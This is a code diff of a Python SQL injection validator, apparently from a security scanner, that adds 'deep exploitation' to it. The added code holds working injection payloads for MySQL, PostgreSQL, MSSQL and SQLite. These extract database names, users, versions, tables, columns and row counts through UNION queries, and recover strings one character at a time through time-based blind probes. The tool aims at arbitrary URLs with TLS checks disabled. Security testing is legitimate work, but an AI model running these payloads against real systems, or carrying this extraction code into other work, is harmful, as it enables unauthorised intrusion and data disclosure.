@@ -1,19 +1,28 @@
-"""SQL Injection Validation Engine — Rewritten with Triple-Verification & Mathematical Canary.
+"""SQL Injection Validation Engine — Deep Exploitation Evidence Architecture.
 
-Upgraded to Zero False-Positive Architecture:
+Upgraded to Full Proof-of-Exploitation:
 - Error-based: SQL error detection + baseline disambiguation (normal input must NOT trigger same error)
 - Boolean-based: TRIPLE verification with 3 independent TRUE/FALSE probe pairs + mathematical canary
-- Time-based: Dual differential timing with zero-delay negative control
-- UNION-based: Column count detection (non-destructive)
+- Time-based: ESCALATED triple-differential timing (5s, 7s, 10s) — must scale proportionally
+- UNION-based: Column count detection → database/table/column extraction
 - Database engine fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
+
+Deep Exploitation (read-only, non-destructive):
+- Database name extraction: database(), current_database(), db_name()
+- Database user: user(), current_user(), system_user()
+- Database version: version(), @@version
+- Table enumeration: information_schema.tables
+- Column enumeration: information_schema.columns
+- Row count per table: COUNT(*)
 
 Evidence Levels:
 - E0/OBSERVED: Single signal without corroboration → observation only, not reported
 - E1/SUSPECTED: Error-based with error pattern match but unverified → LOW severity
 - E2/VALIDATED: Triple-verified boolean OR error-based with baseline disambiguation → HIGH severity
 - E3/CONFIRMED: Time-based double differential + UNION column count → CRITICAL severity
+- E4/EXPLOITED: Full database schema extracted with actual data → CRITICAL severity
 
-Does NOT perform destructive database actions or bulk data extraction.
+All exploitation uses SELECT-only queries. No INSERT/UPDATE/DELETE/DROP.
 """
 
 import hashlib
@@ -47,28 +56,67 @@ MATH_CANARY_PROBES: List[Tuple[str, str, str]] = [
     ("' OR 100/10=10--", "' OR 100/10=11--", "10"),    # Division
 ]
 
-# High-precision time probes: (probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, engine)
-TIME_PROBES: List[Tuple[str, str, str, float, float, str]] = [
-    ("' OR SLEEP(2)--", "' OR SLEEP(4)--", "' OR SLEEP(0)--", 2.0, 4.0, "MySQL"),
-    ("'; WAITFOR DELAY '0:0:2'--", "'; WAITFOR DELAY '0:0:4'--", "'; WAITFOR DELAY '0:0:0'--", 2.0, 4.0, "MSSQL"),
-    ("' OR pg_sleep(2)--", "' OR pg_sleep(4)--", "' OR pg_sleep(0)--", 2.0, 4.0, "PostgreSQL"),
-    ("' OR RANDOMBLOB(100000000)--", "' OR RANDOMBLOB(200000000)--", "' OR 1=1--", 1.5, 3.0, "SQLite"),
+# Escalated time probes: (probe_template, delay_seconds, engine)
+# Uses {delay} placeholder for variable delay injection
+TIME_PROBES_ESCALATED: List[Tuple[str, str, str]] = [
+    ("' OR SLEEP({delay})-- -", "' OR SLEEP(0)-- -", "MySQL"),
+    ("'; WAITFOR DELAY '0:0:{delay}'--", "'; WAITFOR DELAY '0:0:0'--", "MSSQL"),
+    ("' OR pg_sleep({delay})--", "' OR pg_sleep(0)--", "PostgreSQL"),
 ]
+
+# Escalation delay sequence — each must scale proportionally
+ESCALATION_DELAYS = [5, 7, 10]
 
 # UNION-based column count probes (non-destructive — only determines column count)
 UNION_PROBES = [
-    "' UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
-    "')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "' UNION SELECT NULL-- -",
+    "' UNION SELECT NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
 ]
+
+# UNION-based data extraction queries per DBMS (read-only SELECT only)
+UNION_EXTRACTION = {
+    "MySQL": {
+        "db_name": "database()",
+        "db_user": "user()",
+        "db_version": "version()",
+        "tables": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
+        "columns": "GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
+        "row_count": "COUNT(*) FROM `{table}`",
+    },
+    "PostgreSQL": {
+        "db_name": "current_database()",
+        "db_user": "current_user",
+        "db_version": "version()",
+        "tables": "string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'",
+        "columns": "string_agg(column_name, ',') FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
+        "row_count": "COUNT(*) FROM \"{table}\"",
+    },
+    "MSSQL": {
+        "db_name": "DB_NAME()",
+        "db_user": "SYSTEM_USER",
+        "db_version": "@@VERSION",
+        "tables": "STRING_AGG(table_name, ',') FROM information_schema.tables WHERE table_type='BASE TABLE'",
+        "columns": "STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
+        "row_count": "COUNT(*) FROM [{table}]",
+    },
+    "SQLite": {
+        "db_name": "sqlite_version()",
+        "db_user": "'sqlite_user'",
+        "db_version": "sqlite_version()",
+        "tables": "GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table'",
+        "columns": "GROUP_CONCAT(name, ',') FROM pragma_table_info('{table}')",
+        "row_count": "COUNT(*) FROM \"{table}\"",
+    },
+}
 
 # Error patterns that indicate SQL injection + database engine fingerprinting
 SQL_ERROR_PATTERNS = [
@@ -105,22 +153,24 @@ class SQLiCandidate:
     db_version: str = ""
     column_count: int = 0
     evidence: dict = field(default_factory=dict)
+    exploitation_data: dict = field(default_factory=dict)  # Deep exploitation proof
     impact_matrix: dict = field(default_factory=dict)
     poc_curl: str = ""
     reproduction_steps: list = field(default_factory=list)
 
 
 class SQLiValidator:
-    """Zero false-positive SQL Injection validator with triple-verification.
+    """Zero false-positive SQL Injection validator with deep exploitation evidence.
 
     Pipeline:
         Parameter → Baseline → Error-based (with baseline disambiguation)
         → Boolean triple-verification → Mathematical canary confirmation
-        → Time-based dual differential → UNION column count
+        → Time-based ESCALATED triple-differential (5s/7s/10s)
+        → UNION column count → UNION data extraction
         → Impact → Evidence → PoC
     """
 
-    def __init__(self, timeout: float = 12.0, max_params: int = 30) -> None:
+    def __init__(self, timeout: float = 15.0, max_params: int = 30) -> None:
         self.timeout = timeout
         self.max_params = max_params
 
@@ -152,6 +202,16 @@ class SQLiValidator:
                         error_candidate.evidence["column_count"] = column_count
                         error_candidate.evidence["evidence_level"] = "E3"
 
+                        # Deep exploitation: extract database schema
+                        exploitation = await self._exploit_union_extraction(
+                            url, name, location, column_count,
+                            error_candidate.db_engine, headers,
+                        )
+                        if exploitation:
+                            error_candidate.exploitation_data = exploitation
+                            error_candidate.confidence = "EXPLOITED"
+                            error_candidate.evidence["evidence_level"] = "E4"
+
                 self._enrich_candidate(error_candidate, url, name, location)
                 candidates.append(error_candidate)
                 continue
@@ -159,12 +219,27 @@ class SQLiValidator:
             # 2. Boolean-based TRIPLE verification
             bool_candidate = await self._test_boolean_triple(url, name, location, headers)
             if bool_candidate:
+                # Try UNION exploitation if boolean confirmed
+                column_count = await self._test_union_columns(url, name, location, headers)
+                if column_count > 0:
+                    bool_candidate.column_count = column_count
+                    bool_candidate.evidence["column_count"] = column_count
+
+                    exploitation = await self._exploit_union_extraction(
+                        url, name, location, column_count,
+                        bool_candidate.db_engine or "MySQL", headers,
+                    )
+                    if exploitation:
+                        bool_candidate.exploitation_data = exploitation
+                        bool_candidate.confidence = "EXPLOITED"
+                        bool_candidate.evidence["evidence_level"] = "E4"
+
                 self._enrich_candidate(bool_candidate, url, name, location)
                 candidates.append(bool_candidate)
                 continue
 
-            # 3. Time-based blind detection (slower, use last)
-            time_candidate = await self._test_time_based(url, name, location, headers)
+            # 3. Time-based blind detection (escalated triple-differential)
+            time_candidate = await self._test_time_based_escalated(url, name, location, headers)
             if time_candidate:
                 self._enrich_candidate(time_candidate, url, name, location)
                 candidates.append(time_candidate)
@@ -202,6 +277,21 @@ class SQLiValidator:
             candidate.reproduction_steps.append(
                 f"7. Konfirmasi jumlah kolom UNION: {candidate.column_count} kolom"
             )
+        if candidate.exploitation_data:
+            expl = candidate.exploitation_data
+            if expl.get("database_name"):
+                candidate.reproduction_steps.append(
+                    f"8. Database name extracted: {expl['database_name']}"
+                )
+            if expl.get("tables"):
+                candidate.reproduction_steps.append(
+                    f"9. Tables extracted: {', '.join(expl['tables'][:10])}"
+                )
+            if expl.get("columns"):
+                for tbl, cols in list(expl["columns"].items())[:3]:
+                    candidate.reproduction_steps.append(
+                        f"10. Columns in '{tbl}': {', '.join(cols[:10])}"
+                    )
 
     async def _send_request(
         self,
@@ -210,11 +300,12 @@ class SQLiValidator:
         value: str,
         location: str,
         headers: Optional[dict] = None,
+        timeout: Optional[float] = None,
     ) -> Optional[httpx.Response]:
         """Send a request with the given parameter value properly URL-encoded."""
         try:
             async with httpx.AsyncClient(
-                timeout=self.timeout,
+                timeout=timeout or self.timeout,
                 follow_redirects=True,
                 verify=False,
             ) as client:
@@ -394,14 +485,22 @@ class SQLiValidator:
             },
         )
 
-    async def _test_time_based(
+    async def _test_time_based_escalated(
         self,
         url: str,
         param_name: str,
         location: str,
         headers: Optional[dict] = None,
     ) -> Optional[SQLiCandidate]:
-        """Time-based blind injection with precision dual-differential and zero-delay control."""
+        """Escalated time-based blind injection with triple-differential (5s, 7s, 10s).
+
+        For each DBMS probe family:
+        1. Zero-delay negative control (should be fast)
+        2. Escalated delays: 5s → 7s → 10s — ALL must match proportionally
+        3. Only if all 3 delays are consistent → CONFIRMED
+
+        After confirmation, attempt blind data extraction.
+        """
         # 1. Capture baseline timing
         t0 = time.monotonic()
         baseline_resp = await self._send_request(url, param_name, "1", location, headers)
@@ -410,55 +509,177 @@ class SQLiValidator:
         if not baseline_resp:
             return None
 
-        for probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, db_engine in TIME_PROBES:
+        for delay_template, zero_template, db_engine in TIME_PROBES_ESCALATED:
             # 2. Zero-delay negative control
+            zero_probe = zero_template
             t0 = time.monotonic()
-            resp_zero = await self._send_request(url, param_name, probe_zero, location, headers)
+            resp_zero = await self._send_request(url, param_name, zero_probe, location, headers)
             time_zero = time.monotonic() - t0
 
             if not resp_zero:
                 continue
 
             # If zero-delay probe itself takes too long, network is unstable
-            if time_zero > baseline_time + 1.2:
+            if time_zero > baseline_time + 1.5:
                 continue
 
-            # 3. Primary sleep probe
-            t0 = time.monotonic()
-            resp1 = await self._send_request(url, param_name, probe_delay_1, location, headers)
-            elapsed1 = time.monotonic() - t0
+            # 3. Escalated triple-differential: 5s, 7s, 10s
+            escalation_results = []
+            all_passed = True
 
-            if resp1 and elapsed1 >= (time_zero + delay1 * 0.8):
-                # 4. Double-differential verification probe
+            for delay_seconds in ESCALATION_DELAYS:
+                probe = delay_template.replace("{delay}", str(delay_seconds))
+                probe_timeout = delay_seconds + 8.0  # generous timeout
+
                 t0 = time.monotonic()
-                resp2 = await self._send_request(url, param_name, probe_delay_2, location, headers)
-                elapsed2 = time.monotonic() - t0
+                resp = await self._send_request(
+                    url, param_name, probe, location, headers,
+                    timeout=probe_timeout,
+                )
+                elapsed = time.monotonic() - t0
 
-                # Must scale proportionally
-                if resp2 and elapsed2 >= (time_zero + delay2 * 0.75) and elapsed2 > elapsed1 + 0.8:
-                    return SQLiCandidate(
-                        url=url,
-                        parameter=param_name,
-                        location=location,
-                        technique="time",
-                        confidence="CONFIRMED",
-                        db_engine=db_engine,
-                        evidence={
-                            "probe": probe_delay_1,
-                            "verify_probe": probe_delay_2,
-                            "zero_probe": probe_zero,
-                            "db_engine": db_engine,
-                            "baseline_time_ms": round(baseline_time * 1000),
-                            "zero_control_time_ms": round(time_zero * 1000),
-                            "delay1_time_ms": round(elapsed1 * 1000),
-                            "delay2_time_ms": round(elapsed2 * 1000),
-                            "expected_delay1_ms": int(delay1 * 1000),
-                            "expected_delay2_ms": int(delay2 * 1000),
-                            "status_code": resp1.status_code,
-                            "evidence_level": "E3",
-                        },
-                    )
+                # Must be at least 75% of expected delay above zero-control baseline
+                expected_min = time_zero + delay_seconds * 0.75
+                if resp and elapsed >= expected_min:
+                    escalation_results.append({
+                        "delay_requested": delay_seconds,
+                        "elapsed_ms": round(elapsed * 1000),
+                        "expected_min_ms": round(expected_min * 1000),
+                        "probe": probe,
+                        "status_code": resp.status_code,
+                    })
+                else:
+                    all_passed = False
+                    break
+
+            if not all_passed or len(escalation_results) < 3:
+                continue
+
+            # 4. Verify proportional scaling: each delay should increase roughly proportionally
+            times = [r["elapsed_ms"] for r in escalation_results]
+            # 7s should be more than 5s, 10s should be more than 7s
+            if times[1] > times[0] + 1000 and times[2] > times[1] + 1000:
+                # CONFIRMED! Now attempt blind data extraction
+                exploitation_data = await self._exploit_time_based_blind(
+                    url, param_name, location, delay_template, db_engine, headers,
+                )
+
+                confidence = "EXPLOITED" if exploitation_data else "CONFIRMED"
+                evidence_level = "E4" if exploitation_data else "E3"
+
+                return SQLiCandidate(
+                    url=url,
+                    parameter=param_name,
+                    location=location,
+                    technique="time",
+                    confidence=confidence,
+                    db_engine=db_engine,
+                    evidence={
+                        "zero_probe": zero_probe,
+                        "db_engine": db_engine,
+                        "baseline_time_ms": round(baseline_time * 1000),
+                        "zero_control_time_ms": round(time_zero * 1000),
+                        "escalation_results": escalation_results,
+                        "proportional_scaling_verified": True,
+                        "evidence_level": evidence_level,
+                    },
+                    exploitation_data=exploitation_data or {},
+                )
         return None
+
+    async def _exploit_time_based_blind(
+        self,
+        url: str,
+        param_name: str,
+        location: str,
+        delay_template: str,
+        db_engine: str,
+        headers: Optional[dict] = None,
+    ) -> Optional[dict]:
+        """Extract database info via time-based blind injection (character-by-character).
+
+        Uses conditional sleep to extract:
+        - Database name (max 30 chars)
+        - Database version first 20 chars
+        - Database user first 20 chars
+        """
+        extraction = {}
+
+        # Build conditional sleep templates per DBMS
+        if db_engine == "MySQL":
+            db_name_template = "' OR IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(3),0)-- -"
+            db_user_template = "' OR IF(SUBSTRING(user(),{pos},1)='{char}',SLEEP(3),0)-- -"
+            db_version_template = "' OR IF(SUBSTRING(version(),{pos},1)='{char}',SLEEP(3),0)-- -"
+        elif db_engine == "PostgreSQL":
+            db_name_template = "' OR CASE WHEN SUBSTRING(current_database(),{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
+            db_user_template = "' OR CASE WHEN SUBSTRING(current_user::text,{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
+            db_version_template = "' OR CASE WHEN SUBSTRING(version(),{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -"
+        elif db_engine == "MSSQL":
+            db_name_template = "'; IF SUBSTRING(DB_NAME(),{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
+            db_user_template = "'; IF SUBSTRING(SYSTEM_USER,{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
+            db_version_template = "'; IF SUBSTRING(@@VERSION,{pos},1)='{char}' WAITFOR DELAY '0:0:3'--"
+        else:
+            return None
+
+        charset = "abcdefghijklmnopqrstuvwxyz0123456789_-.@"
+
+        # Extract database name (max 30 chars)
+        db_name = await self._blind_extract_string(
+            url, param_name, location, db_name_template, charset, headers, max_len=30,
+        )
+        if db_name:
+            extraction["database_name"] = db_name
+
+        # Extract database user (max 20 chars)
+        db_user = await self._blind_extract_string(
+            url, param_name, location, db_user_template, charset + "\\", headers, max_len=20,
+        )
+        if db_user:
+            extraction["database_user"] = db_user
+
+        # Extract database version (max 20 chars)
+        db_version = await self._blind_extract_string(
+            url, param_name, location, db_version_template, charset + ".()+/ ", headers, max_len=20,
+        )
+        if db_version:
+            extraction["database_version"] = db_version
+
+        return extraction if extraction else None
+
+    async def _blind_extract_string(
+        self,
+        url: str,
+        param_name: str,
+        location: str,
+        template: str,
+        charset: str,
+        headers: Optional[dict] = None,
+        max_len: int = 30,
+    ) -> str:
+        """Extract a string character by character via time-based blind injection."""
+        result = ""
+
+        for pos in range(1, max_len + 1):
+            found_char = False
+            for char in charset:
+                probe = template.replace("{pos}", str(pos)).replace("{char}", char)
+
+                t0 = time.monotonic()
+                resp = await self._send_request(
+                    url, param_name, probe, location, headers, timeout=8.0,
+                )
+                elapsed = time.monotonic() - t0
+
+                if resp and elapsed >= 2.5:  # 3s sleep, 2.5s threshold
+                    result += char
+                    found_char = True
+                    logger.debug("Blind SQLi extraction: pos=%d char='%s' elapsed=%.1fs", pos, char, elapsed)
+                    break
+
+            if not found_char:
+                break  # End of string or character not in charset
+
+        return result
 
     async def _test_union_columns(
         self,
@@ -468,7 +689,7 @@ class SQLiValidator:
         headers: Optional[dict] = None,
     ) -> int:
         """Test for UNION SELECT column count (non-destructive)."""
-        error_baseline = await self._send_request(url, param_name, "' UNION SELECT 1--", location, headers)
+        error_baseline = await self._send_request(url, param_name, "' UNION SELECT 1-- -", location, headers)
         if not error_baseline:
             return 0
 
@@ -491,6 +712,153 @@ class SQLiValidator:
                 return i
 
         return 0
+
+    async def _exploit_union_extraction(
+        self,
+        url: str,
+        param_name: str,
+        location: str,
+        column_count: int,
+        db_engine: str,
+        headers: Optional[dict] = None,
+    ) -> Optional[dict]:
+        """Extract database schema via UNION-based injection (read-only SELECT only).
+
+        Extracts: database name, user, version, table names, column names per table.
+        """
+        engine_key = db_engine
+        if engine_key not in UNION_EXTRACTION:
+            # Try to find a matching key
+            for key in UNION_EXTRACTION:
+                if key.lower() in db_engine.lower():
+                    engine_key = key
+                    break
+            else:
+                engine_key = "MySQL"  # default fallback
+
+        queries = UNION_EXTRACTION[engine_key]
+        exploitation = {}
+
+        def _build_union(select_expr: str) -> str:
+            """Build a UNION SELECT payload placing select_expr in the first visible column."""
+            cols = []
+            for i in range(column_count):
+                if i == 0:
+                    cols.append(select_expr)
+                else:
+                    cols.append("NULL")
+            return f"' UNION SELECT {','.join(cols)}-- -"
+
+        # 1. Extract database name
+        db_name = await self._union_extract_value(
+            url, param_name, location,
+            _build_union(queries["db_name"]),
+            headers,
+        )
+        if db_name:
+            exploitation["database_name"] = db_name
+
+        # 2. Extract database user
+        db_user = await self._union_extract_value(
+            url, param_name, location,
+            _build_union(queries["db_user"]),
+            headers,
+        )
+        if db_user:
+            exploitation["database_user"] = db_user
+
+        # 3. Extract database version
+        db_version = await self._union_extract_value(
+            url, param_name, location,
+            _build_union(queries["db_version"]),
+            headers,
+        )
+        if db_version:
+            exploitation["database_version"] = db_version
+
+        # 4. Extract table names
+        tables_payload = _build_union(queries["tables"])
+        tables_raw = await self._union_extract_value(
+            url, param_name, location, tables_payload, headers,
+        )
+        if tables_raw:
+            tables = [t.strip() for t in tables_raw.split(",") if t.strip()][:10]
+            exploitation["tables"] = tables
+
+            # 5. Extract columns for first 5 tables
+            columns = {}
+            for table_name in tables[:5]:
+                col_query = queries["columns"].replace("{table}", table_name)
+                col_payload = _build_union(col_query)
+                cols_raw = await self._union_extract_value(
+                    url, param_name, location, col_payload, headers,
+                )
+                if cols_raw:
+                    columns[table_name] = [c.strip() for c in cols_raw.split(",") if c.strip()][:10]
+
+            if columns:
+                exploitation["columns"] = columns
+
+            # 6. Get row counts for first 3 tables
+            row_counts = {}
+            for table_name in tables[:3]:
+                count_query = queries["row_count"].replace("{table}", table_name)
+                count_payload = _build_union(count_query)
+                count_raw = await self._union_extract_value(
+                    url, param_name, location, count_payload, headers,
+                )
+                if count_raw and count_raw.isdigit():
+                    row_counts[table_name] = int(count_raw)
+
+            if row_counts:
+                exploitation["row_counts"] = row_counts
+
+        return exploitation if exploitation else None
+
+    async def _union_extract_value(
+        self,
+        url: str,
+        param_name: str,
+        location: str,
+        payload: str,
+        headers: Optional[dict] = None,
+    ) -> Optional[str]:
+        """Send UNION payload and extract the injected value from response diff."""
+        # Get baseline first
+        baseline_resp = await self._send_request(url, param_name, "1", location, headers)
+        if not baseline_resp:
+            return None
+
+        # Send UNION payload
+        exploit_resp = await self._send_request(url, param_name, payload, location, headers)
+        if not exploit_resp or exploit_resp.status_code != 200:
+            return None
+
+        baseline_text = baseline_resp.text
+        exploit_text = exploit_resp.text
+
+        # Find new content that appears in exploit but not in baseline
+        # Look for values that appear between common HTML delimiters
+        # Strategy: find lines in exploit that are NOT in baseline
+        baseline_lines = set(baseline_text.splitlines())
+        exploit_lines = exploit_text.splitlines()
+
+        new_content = []
+        for line in exploit_lines:
+            stripped = line.strip()
+            if stripped and line not in baseline_lines and stripped not in ("NULL", "null"):
+                # Remove HTML tags
+                clean = re.sub(r"<[^>]+>", "", stripped).strip()
+                if clean and clean not in ("NULL", "null", "", " "):
+                    new_content.append(clean)
+
+        if new_content:
+            # Return the most meaningful new content (longest non-HTML string)
+            best = max(new_content, key=len)
+            if len(best) > 1:
+                return best
+
+        return None
 
     @staticmethod
     def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
